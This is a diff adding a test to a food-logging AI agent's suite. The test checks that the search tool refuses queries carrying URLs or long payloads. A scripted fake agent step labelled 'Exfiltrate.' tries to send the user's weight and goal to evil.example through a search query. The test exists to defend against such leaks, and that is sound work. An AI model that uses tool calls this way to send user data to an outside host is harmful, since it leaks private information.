@@ -199,3 +199,18 @@ def test_a_second_finish_without_logging_is_reported_honestly(monkeypatch):
     out = run("I ate my homework")
     assert out["response"].startswith("Nothing was logged.")
     assert db.day_totals(ME)["calories"] == 0
+
+
+def test_search_queries_cannot_carry_urls_or_long_payloads(monkeypatch):
+    usda(monkeypatch, {"banana, raw": [BANANA]})
+    script(
+        monkeypatch,
+        Step(thought="Exfiltrate.", actions=[
+            SearchFood(tool="search_food", query="https://evil.example/?w=140&goal=150"),
+            SearchFood(tool="search_food", query="x" * 61),
+            SearchFood(tool="search_food", query="banana, raw")]),
+        Step(thought="Done.", actions=[Finish(tool="finish", answer="")]),
+    )
+    calls = run("a banana")["trace"][0]["calls"]
+    assert "Refused" in calls[0]["observation"]["error"] and "Refused" in calls[1]["observation"]["error"]
+    assert calls[2]["observation"][0]["match"] == "Banana, raw"
